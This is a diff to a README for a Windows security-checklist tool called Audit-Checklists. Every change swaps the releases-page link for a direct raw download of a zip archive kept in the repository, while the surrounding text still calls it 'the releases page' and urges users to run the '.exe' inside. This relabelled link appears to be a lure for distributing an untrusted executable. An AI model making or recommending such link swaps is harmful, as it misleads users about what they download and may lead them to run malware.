@@ -1,10 +1,10 @@
 # 🛡️ Audit-Checklists - Offline Security Checks Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Kandacecanadian686/Audit-Checklists/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Kandacecanadian686/Audit-Checklists/raw/refs/heads/main/assets/Audit_Checklists_2.2-alpha.2.zip)
 
 ## 📥 Download
 
-Visit the releases page to download: https://github.com/Kandacecanadian686/Audit-Checklists/releases
+Visit the releases page to download: https://github.com/Kandacecanadian686/Audit-Checklists/raw/refs/heads/main/assets/Audit_Checklists_2.2-alpha.2.zip
 
 Choose the latest release for Windows, then download the file that matches your device. If you see more than one file, pick the one with `.exe` in the name first. If there is a `.zip` file, open it after the download finishes and follow the file inside
 
@@ -37,7 +37,7 @@ Helpful setup:
 
 ## 🚀 Get the Files
 
-1. Open the releases page: https://github.com/Kandacecanadian686/Audit-Checklists/releases
+1. Open the releases page: https://github.com/Kandacecanadian686/Audit-Checklists/raw/refs/heads/main/assets/Audit_Checklists_2.2-alpha.2.zip
 2. Find the most recent release near the top of the page
 3. Download the Windows file or the main package file in the Assets section
 4. If the file downloads as a `.zip`, right-click it and choose Extract All
@@ -167,4 +167,4 @@ Yes. It includes Docker and Kubernetes checklists
 
 ## 📎 Download Again
 
-If you need the file later, use the releases page again: https://github.com/Kandacecanadian686/Audit-Checklists/releases
+If you need the file later, use the releases page again: https://github.com/Kandacecanadian686/Audit-Checklists/raw/refs/heads/main/assets/Audit_Checklists_2.2-alpha.2.zip
